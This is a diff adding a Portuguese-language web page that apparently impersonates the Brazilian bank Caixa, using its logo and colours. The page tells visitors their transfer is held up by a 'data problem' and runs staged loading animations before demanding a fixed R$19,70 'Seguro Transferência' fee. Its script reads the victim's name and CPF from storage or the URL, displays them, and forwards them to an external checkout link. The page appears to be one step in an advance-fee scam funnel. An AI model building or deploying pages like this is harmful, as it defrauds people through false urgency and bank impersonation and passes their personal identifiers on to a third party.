@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>Seguro Transferência</title>
+
+  <script>
+    localStorage.setItem("upsell", "up5");
+  </script>
+
+  <link rel="stylesheet" href="/upsell4/css/products.css">
+  <link rel="stylesheet" href="/upsell4/css/styles.css">
+  <link rel="stylesheet" href="/upsell4/css/fonts.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Sharp:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&icon_names=person">
+
+  <script src="js/latest_1.js" data-utmify-prevent-subids async defer></script>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
+</head>
+
+<body>
+
+  <script>
+    window.pixelId = "692cedccf1d8644d9b7bb3bc";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
+
+  
+  <style>
+    .navbar {
+      display: flex;
+      align-items: center;
+      padding: 1rem;
+      background: linear-gradient(to right, #015CA9, #049FD6);
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+  </style>
+
+  <nav class="navbar">
+    <div style="display:flex; justify-content:center; align-items:center; gap:1rem;">
+      <div class="menu-icon">
+        <img src="/upsell4/images/caixaiconeb.png" style="height: 1.8rem; width: auto;" alt="Logo Central">
+      </div>
+
+      <div class="user-info" style="line-height:1;">
+        <h1 style="font-weight:500; font-size:.9em; color:#fff; margin:0; margin-bottom:2px;" id="userName">--</h1>
+        <p style="font-size:.9rem; color:#fff; margin:0;" id="userDocument">--</p>
+      </div>
+    </div>
+  </nav>
+
+  <div id="ad1">
+    <p style="margin-left:5%; font-family:'GellixMedium'; font-size:22px;">Sua transferência</p>
+
+    <div class="ad1">
+      <div style="margin-left:3%; margin-right:3%;">
+        <button class="styled-button">
+          <span class="button-text">
+            <span class="button-title"></span>
+          </span>
+        </button>
+
+        <div class="entrega-container">
+          <div class="entrega-header">Status</div>
+
+          <div class="entrega-content">
+            <div class="icon-container2">
+              <span class="material-symbols-outlined">check</span>
+            </div>
+            <div class="text-container">
+              <div class="entrega-title">Autenticidade confirmada</div>
+            </div>
+          </div>
+
+          <div class="entrega-content">
+            <div class="icon-container3">
+              <span class="material-symbols-outlined">warning</span>
+            </div>
+            <div class="text-container">
+              <div class="entrega-title">Pendência nos dados</div>
+            </div>
+          </div>
+        </div>
+
+        <p style="text-align:center; margin-left:3%; margin-right:3%;">
+          Seu pagamento foi concluido com sucesso, porém foi encontrado uma pendência nos seus dados.
+          Clique abaixo para resolver esse problema!
+        </p>
+
+        <div class="button-container" style="padding-bottom:20px;">
+          <button class="styled-button2" onclick="showAd2()">
+            <span class="button-text">
+              <span class="button-title2">Resolver problema</span>
+            </span>
+            <span class="material-symbols-outlined" style="font-size:32px; color:white!important;">arrow_forward_ios</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="ad2" style="display:none;">
+    <p style="margin-left:5%; font-family:'GellixMedium'; font-size:22px;">Problemas na transferência</p>
+
+    <div class="ad2" style="padding-top:15px; padding-bottom:15px;">
+      <div style="padding-top:2px;"></div>
+
+      <div id="loadingGif" class="loading">
+        <div class="spinner"></div>
+      </div>
+
+      <div class="entrega-container hidden" id="text1">
+        <div class="entrega-content">
+          <div class="icon-container2">
+            <span class="material-symbols-outlined">settings</span>
+          </div>
+          <div class="text-container">
+            <div class="entrega-title">Estamos identificando o problema nos seus dados!</div>
+          </div>
+        </div>
+      </div>
+
+      <div id="loadingGif2" class="loading hidden">
+        <div class="spinner"></div>
+      </div>
+
+      <div id="text2" class="hidden entrega-container" style="margin-top:15px;">
+        <div class="entrega-content">
+          <div class="icon-container2" style="background-color:red;">
+            <span class="material-symbols-outlined">warning</span>
+          </div>
+          <div class="text-container">
+            <div class="entrega-title">Identificamos que há uma pendência nos seus dados de transferência!</div>
+          </div>
+        </div>
+      </div>
+
+      <div id="loadingGif3" class="loading hidden" style="padding-top:20px;">
+        <div class="spinner"></div>
+      </div>
+
+      <div id="text3" class="hidden entrega-container" style="background-color:#d40303; margin-top:15px;">
+        <div class="entrega-content">
+          <div class="icon-container2" style="background-color:#fff;">
+            <span class="material-symbols-outlined" style="color:#d40303;">priority_high</span>
+          </div>
+          <div class="text-container">
+            <div class="entrega-title" style="color:white">
+              É necessário realizar o pagamento da <span class="bold">Última taxa (Taxa do Seguro Transferência)</span>
+              para corrigir a pendência e liberar sua transferência. O valor é único e fixo de <span class="bold">R$19,70</span>.
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ======== HELPERS PADRÃO DO FUNIL (dadosUsuario / simulacao) ========
+    function onlyDigits(v) { return (v || "").replace(/\D/g, ""); }
+
+    function formatCPF(cpf) {
+      var clean = onlyDigits(cpf).slice(0, 11);
+      if (clean.length !== 11) return cpf || "--";
+      return clean.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+    }
+
+    function getURLParams() {
+      var p = new URLSearchParams(window.location.search);
+      var o = {};
+      p.forEach(function(v, k){ o[k] = v; });
+      return o;
+    }
+
+    function getLeadData() {
+      var nome = "";
+      var cpf = "";
+
+      // 1) Padrão do funil: dadosUsuario
+      try {
+        var du = JSON.parse(localStorage.getItem("dadosUsuario") || "{}");
+        if (du && typeof du === "object") {
+          if (du.nome) nome = String(du.nome);
+          if (du.cpf) cpf = String(du.cpf);
+        }
+      } catch (e) {}
+
+      // 2) fallback: nomeUsuario
+      if (!nome) {
+        try { nome = localStorage.getItem("nomeUsuario") || ""; } catch (e) {}
+      }
+
+      // 3) fallback: URL (compatível com nome/cpf e name/document)
+      var params = getURLParams();
+      if (!nome) nome = (params.nome || params.name || "").replace(/\+/g, " ").trim();
+      if (!cpf) cpf = (params.cpf || params.document || "").trim();
+
+      // Normalizações
+      nome = (nome || "Cliente").replace(/\+/g, " ").trim();
+      cpf = onlyDigits(cpf);
+
+      return { nome: nome, cpf: cpf };
+    }
+
+    function applyLeadToHeader() {
+      var lead = getLeadData();
+      var userNameElement = document.getElementById("userName");
+      var userDocumentElement = document.getElementById("userDocument");
+
+      if (userNameElement) userNameElement.textContent = lead.nome || "Cliente";
+      if (userDocumentElement) userDocumentElement.textContent = lead.cpf ? formatCPF(lead.cpf) : "--";
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      applyLeadToHeader();
+    });
+
+    // ======== SUA FUNÇÃO (mantida) ========
+    function openNewWindowWithUTMs(url) {
+      const currentUrlParams = new URLSearchParams(window.location.search);
+      let utms = '';
+
+      for (let [key, value] of currentUrlParams.entries()) {
+        if (key.startsWith('')) {
+          utms += `${key}=${value}&`;
+        }
+      }
+
+      if (utms) utms = utms.slice(0, -1);
+      const fullUrl = url + (utms ? '?' + utms : '');
+      window.open(fullUrl, '_blank');
+    }
+  </script>
+
+  <div id="finalButton" class="button-container hidden" style="padding-top:15px;">
+    <button class="styled-button3" onclick="checkout(event)">
+      <span class="button-text">
+        <span class="button-title2">Pagar o Seguro Transferência</span>
+      </span>
+      <span class="material-symbols-outlined" style="font-size:32px;">arrow_forward_ios</span>
+    </button>
+  </div>
+
+  <div style="padding-bottom:2px;"></div>
+
+  <script>
+    function checkout(event) {
+      event.preventDefault();
+
+      // Mantém UTMs e garante nome/cpf do padrão do funil na URL do checkout
+      var lead = getLeadData();
+      var params = new URLSearchParams(window.location.search);
+
+      if (!params.get("nome") && lead.nome) params.set("nome", lead.nome);
+      if (!params.get("cpf") && lead.cpf) params.set("cpf", lead.cpf);
+
+      // Compatibilidade (se algum fluxo antigo usa name/document)
+      if (!params.get("name") && lead.nome) params.set("name", lead.nome);
+      if (!params.get("document") && lead.cpf) params.set("document", lead.cpf);
+
+      window.location.href =
+        "https://www.pay-pagamentos.link/checkout/16406de3-d209-41d5-8f4d-f0042141375b" +
+        "?" + params.toString();
+    }
+  </script>
+
+  <script src="/upsell4/js/scripts.js"></script>
+  <script src="js/latest_2.js" data-utmify-prevent-subids async defer></script>
+</body>
+</html>
